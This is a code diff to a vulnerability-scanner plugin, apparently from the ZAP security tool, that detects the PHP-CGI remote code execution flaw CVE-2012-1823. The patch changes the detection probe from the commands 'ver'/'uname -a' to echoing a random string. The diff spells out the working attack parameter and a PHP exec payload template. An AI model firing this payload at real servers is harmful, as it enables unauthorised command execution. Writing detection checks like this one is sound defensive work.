@@ -21,6 +21,7 @@ import java.util.Arrays;
 
 import org.apache.commons.httpclient.HttpStatus;
 import org.apache.commons.httpclient.URI;
+import org.apache.commons.lang.RandomStringUtils;
 import org.apache.log4j.Logger;
 import org.parosproxy.paros.Constant;
 import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
@@ -50,6 +51,10 @@ public class RemoteCodeExecutionCVE20121823 extends AbstractAppPlugin {
 	 */
 	private static final Logger log = Logger.getLogger(RemoteCodeExecutionCVE20121823.class);
 
+	/**
+	 * a random string (which remains constant across multiple runs, as long as Zap is not 
+	 */
+	static String randomString = RandomStringUtils.random(20, "abcdefghijklmnopqrstuvwxyz0123456789");
 
 	/**
 	 * returns the plugin id
@@ -119,9 +124,9 @@ public class RemoteCodeExecutionCVE20121823 extends AbstractAppPlugin {
 			String attackParam = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
 			String payloadBoilerPlate = "<?php exec('<<<<COMMAND>>>>',$colm);echo join(\"\n\",$colm);die();?>";
 			String [] payloads = {
-					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "cmd /c ver"), 
-					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "uname -a")}
-					;			
+					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "cmd.exe /C echo "+ randomString), 
+					payloadBoilerPlate.replace("<<<<COMMAND>>>>", "echo "+ randomString)
+					};
 			//tries payloads for Linux/Unix, and Windows until we find something that works
 			for ( String payload : payloads) {
 				URI originalURI = getBaseMsg().getRequestHeader().getURI();
@@ -137,12 +142,14 @@ public class RemoteCodeExecutionCVE20121823 extends AbstractAppPlugin {
 				
 				sendAndReceive(attackmsg, false); //do not follow redirects
 				byte [] attackResponseBody = attackmsg.getResponseBody().getBytes();
+				String responseBody = new String(attackResponseBody);
 				
-				//if the command was not recognised (by the host OS), we get a response size of 0
-				if (attackmsg.getResponseHeader().getStatusCode() == HttpStatus.SC_OK 
-						&& attackResponseBody.length> 0 
-						&& ! Arrays.equals(originalResponseBody, attackResponseBody)) {
-					String responseBody = new String(attackmsg.getResponseBody().getBytes());					
+				//if the command was not recognised (by the host OS), we get a response size of 0 on PHP, but not on Tomcat
+				//to be sure it's not a false positive, we look for a string to be echoed  
+				if (	attackmsg.getResponseHeader().getStatusCode() == HttpStatus.SC_OK 
+						&& attackResponseBody.length>= randomString.length()
+						&& responseBody.startsWith(randomString)						
+						) {
 					if ( log.isDebugEnabled() ) {
 						log.debug("Remote Code Execution alert for: "+ originalURI.getURI());
 					}
